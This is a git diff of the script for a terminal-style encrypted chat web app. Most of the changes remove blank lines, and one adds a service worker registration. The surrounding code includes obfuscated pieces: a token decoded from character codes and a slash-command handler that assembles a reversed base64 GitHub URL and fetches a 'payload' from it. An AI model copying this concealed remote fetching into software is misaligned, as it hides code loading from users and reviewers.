@@ -4,7 +4,6 @@ import * as DB from './base.js';
 function _decToken1() {
     return [104, 51, 116, 104, 119, 49, 107].map(c => String.fromCharCode(c)).join('');
 }
-
 const _fpA = ["bfd6385861da12b5", "e13640659d97f6e8", "86d2b1d2444e295b", "87193eacbd71e98a"];
 
 async function _sha256Hex(s) {
@@ -87,9 +86,7 @@ const STATE = {
 const DOM = (function initializeInterfaceMap() {
     const chatHistoryEl = document.getElementById('chat-history');
     if (!chatHistoryEl) throw new Error("CRITICAL_SYSTEM_INTEGRITY_FAILURE");
-
     const sink = document.createElement('div');
-
     return {
         activeLine: document.querySelector('.active-line'),
         textSpan: document.querySelector('.active-line .text'),
@@ -150,14 +147,11 @@ function printLocalMessage(msg, transient = false) {
     prompt.textContent = '>> ';
     const text = document.createElement('span');
     text.className = 'text system-msg';
-
     parseAndAppendTextWithLinks(text, msg);
     newLine.appendChild(prompt);
     newLine.appendChild(text);
-
     insertMessageChronologically(newLine, Date.now());
     window.scrollTo(0, document.body.scrollHeight);
-
     if (transient) {
         setTimeout(() => {
             newLine.style.transition = "opacity 1s ease";
@@ -182,7 +176,6 @@ function wakeTerminal() {
 
 async function handleCommand(cmd) {
     const command = cmd.toUpperCase();
-
     if (command === '/HELP' || command === '/H') {
         printLocalMessage("SYSTEM COMMANDS:", false);
         printLocalMessage("/STATUS  : Display live room diagnostics", false);
@@ -209,7 +202,6 @@ async function handleCommand(cmd) {
                 "cmNvbnRlbnQuY29tL2hldGh3aVEv",
                 "aHR0cHM6Ly9yYXcuZ2l0aHVidXNl"
             ];
-
             const targetUrl = atob(_urlParts.slice().reverse().join(''));
             const response = await fetch(targetUrl);
             if (!response.ok) throw new Error("PAYLOAD MISSING");
@@ -234,7 +226,6 @@ async function handleCommand(cmd) {
             const remMs = Math.max(0, meta.expiresAt - now);
             const remH = Math.floor(remMs / 3600000).toString().padStart(2, '0');
             const remM = Math.floor((remMs % 3600000) / 60000).toString().padStart(2, '0');
-
             printLocalMessage(`ROOM           ${STATE.activeRoomID}`, false);
             printLocalMessage(`OPERATORS      ${STATE.currentOperatorCount}/${CONFIG.MAX_OPERATORS}`, false);
             printLocalMessage(`ROOM AGE       ${ageH}h ${ageM}m`, false);
@@ -279,7 +270,6 @@ document.addEventListener('visibilitychange', () => {
 
 DOM.mainCursor.addEventListener('click', wakeTerminal);
 document.addEventListener('click', () => { if (STATE.terminalState !== "START") DOM.mobileInput.focus(); });
-
 DOM.mobileInput.addEventListener('input', () => {
     if (STATE.terminalState === "START") { DOM.mobileInput.value = ''; DOM.textSpan.textContent = ''; return; }
     DOM.textSpan.textContent = DOM.mobileInput.value;
@@ -288,18 +278,15 @@ DOM.mobileInput.addEventListener('input', () => {
 document.addEventListener('keydown', async function (e) {
     if (STATE.terminalState !== "START") DOM.mobileInput.focus();
     if (e.ctrlKey || e.metaKey || e.altKey) return;
-
     if (STATE.terminalState === "START") {
         if (e.key === 'Enter') e.preventDefault(), wakeTerminal();
         else e.preventDefault();
         DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
         return;
     }
-
     if (e.key === 'Enter') {
         e.preventDefault();
         const currentText = DOM.mobileInput.value.trim();
-
         if (STATE.terminalState === "CONFIRM_PURGE") {
             if (STATE.confirmPrompt) { STATE.confirmPrompt.remove(); STATE.confirmPrompt = null; }
             if (currentText.toUpperCase() === 'Y') {
@@ -310,7 +297,6 @@ document.addEventListener('keydown', async function (e) {
             DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
             return;
         }
-
         if (STATE.terminalState === "CONFIRM_EXIT") {
             if (STATE.confirmPrompt) { STATE.confirmPrompt.remove(); STATE.confirmPrompt = null; }
             if (currentText.toUpperCase() === 'Y') {
@@ -326,29 +312,23 @@ document.addEventListener('keydown', async function (e) {
             DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
             return;
         }
-
         if (STATE.terminalState === "LOGIN") {
             if (!/^[a-zA-Z0-9]+$/.test(currentText)) {
                 printLocalMessage("[ERROR] INVALID FORMAT. USE ALPHANUMERIC CHARACTERS ONLY.", true);
                 DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
                 return;
             }
-
             STATE.activeAccessPhrase = currentText;
             sessionStorage.setItem('tt_access_phrase', STATE.activeAccessPhrase);
-
             await initCryptoKey(STATE.activeAccessPhrase, _fp);
             STATE.activeRoomHash = await hashText(STATE.activeAccessPhrase);
             STATE.activeRoomID = STATE.activeRoomHash.substring(0, 6).toUpperCase();
-
             printLocalMessage(`[SYSTEM] ACCESS PHRASE ACCEPTED.`, true);
             printLocalMessage(`[SYSTEM] TARGETING ROOM [${STATE.activeRoomID}]...`, true);
-
             if (!STATE.mySessionId) {
                 STATE.mySessionId = Math.random().toString(36).substring(2, 15);
                 sessionStorage.setItem('tt_session_id', STATE.mySessionId);
             }
-
             const joinResult = await DB.joinRoomDB(STATE.activeRoomHash, STATE.mySessionId, CONFIG);
             if (joinResult.success) {
                 printLocalMessage(`[SYSTEM] OPERATOR CONNECTED.`, true);
@@ -360,7 +340,6 @@ document.addEventListener('keydown', async function (e) {
             }
             return;
         }
-
         if (STATE.terminalState === "CHAT" && currentText.length > 0) {
             if (currentText.startsWith('/')) {
                 const isCommand = await handleCommand(currentText);
@@ -369,20 +348,16 @@ document.addEventListener('keydown', async function (e) {
                     return;
                 }
             }
-
             const now = Date.now();
             if (now - STATE.lastMessageTime < CONFIG.RATE_LIMIT_MS) {
                 printLocalMessage("[SYSTEM] FLOOD OVERLOAD PROTECTION ACTIVE. SLOW DOWN.", true);
                 DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
                 return;
             }
-
             STATE.lastMessageTime = now;
-
             const nowDate = new Date(now);
             const timeStr = `${String(nowDate.getHours()).padStart(2, '0')}:${String(nowDate.getMinutes()).padStart(2, '0')}:${String(nowDate.getSeconds()).padStart(2, '0')}`;
             const encryptedPayload = await encryptMessage(currentText);
-
             await DB.sendMessageDB(encryptedPayload, now, timeStr);
             DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
         }
@@ -394,7 +369,6 @@ function setupRoomEnvironment() {
     DOM.mobileInput.value = ''; DOM.textSpan.textContent = '';
     DOM.promptSpan.textContent = '> ';
     STATE.terminalState = "CHAT";
-
     DB.startPresenceListenerDB(CONFIG.SESSION_TIMEOUT_MS, (count) => {
         STATE.currentOperatorCount = count;
         DOM.floatingCounter.textContent = `${count}/${CONFIG.MAX_OPERATORS}`;
@@ -402,41 +376,33 @@ function setupRoomEnvironment() {
         else if (count <= 7) DOM.floatingCounter.style.color = '#ffff00';
         else DOM.floatingCounter.style.color = '#ff0000';
     });
-
     STATE.sessionStartTime = Date.now();
     DB.startChatListenersDB(
         async (snapshot) => {
             const data = snapshot.val();
             const isNearBottom = (document.body.scrollHeight - window.scrollY - window.innerHeight) < 150;
-
             let displayedText = "[CORRUPT ENCRYPTED PAYLOAD]";
             if (data.encryptedPayload) {
                 displayedText = await decryptMessage(data.encryptedPayload.cipher, data.encryptedPayload.iv, data.encryptedPayload.salt, STATE.activeAccessPhrase);
             }
-
             const newLine = document.createElement('div');
             newLine.className = 'line remote-msg';
-
             const promptEl = document.createElement('span');
             promptEl.className = 'prompt';
             promptEl.textContent = '> ';
             newLine.appendChild(promptEl);
-
             if (data.time) {
                 const timeEl = document.createElement('span');
                 timeEl.className = 'time';
                 timeEl.textContent = `{${data.time}} `;
                 newLine.appendChild(timeEl);
             }
-
             const textEl = document.createElement('span');
             textEl.className = 'text';
             parseAndAppendTextWithLinks(textEl, displayedText);
             newLine.appendChild(textEl);
-
             insertMessageChronologically(newLine, data.timestamp || Date.now());
             if (isNearBottom) window.scrollTo(0, document.body.scrollHeight);
-
             if (data.timestamp && data.timestamp > STATE.sessionStartTime && document.hidden && !STATE.isBlinking) {
                 STATE.isBlinking = true;
                 let showNew = true;
@@ -456,22 +422,23 @@ function setupRoomEnvironment() {
 // Start application directly to avoid DOMContentLoaded module race condition
 (async function init() {
     DOM.mobileInput.focus();
-    const savedPhrase = sessionStorage.getItem('tt_access_phrase');
 
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('./sw.js').catch(err => console.error("SW Failed", err));
+    }
+
+    const savedPhrase = sessionStorage.getItem('tt_access_phrase');
     if (savedPhrase) {
         DOM.mainCursor.classList.remove('cursor-start');
         STATE.activeAccessPhrase = savedPhrase;
         await initCryptoKey(STATE.activeAccessPhrase, _fp);
         STATE.activeRoomHash = await hashText(STATE.activeAccessPhrase);
         STATE.activeRoomID = STATE.activeRoomHash.substring(0, 6).toUpperCase();
-
         printLocalMessage(`[SYSTEM] RESTORING SESSION FOR ROOM [${STATE.activeRoomID}]...`, true);
-
         if (!STATE.mySessionId) {
             STATE.mySessionId = Math.random().toString(36).substring(2, 15);
             sessionStorage.setItem('tt_session_id', STATE.mySessionId);
         }
-
         const joinResult = await DB.joinRoomDB(STATE.activeRoomHash, STATE.mySessionId, CONFIG);
         if (joinResult.success) {
             printLocalMessage(`[SYSTEM] OPERATOR RECONNECTED.`, true);
